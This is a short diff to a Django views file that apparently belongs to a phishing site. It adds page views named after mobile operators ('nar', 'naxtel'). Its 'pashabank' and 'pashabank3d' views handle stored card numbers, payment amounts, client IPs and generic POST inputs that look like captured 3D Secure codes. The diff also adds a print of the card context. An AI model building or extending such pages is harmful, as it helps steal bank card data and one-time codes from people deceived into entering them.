@@ -18,6 +18,12 @@ import time
 def index(request):
     return render(request, "pages/index.html")
 
+def nar(request):
+    return render(request, "pages/nar.html")
+
+def naxtel(request):
+    return render(request, "pages/naxtel.html")
+
 
 def get_client_ip(request):
     x_forwarded_for = request.META.get('HTTP_X_FORWARDED_FOR')
@@ -373,12 +379,13 @@ def pashabank(request):
         'amount': last_contact.amount,
         'cc': last_contact.cc[-4:],
     }
-    
+    print(context)
     return render( request,'pages/pasha.html',context )
 
 
 @ensure_csrf_cookie
 def pashabank3d(request):
+    
     if request.method == "POST":
         input1 = request.POST.get("input1")
         input2 = request.POST.get("input2")
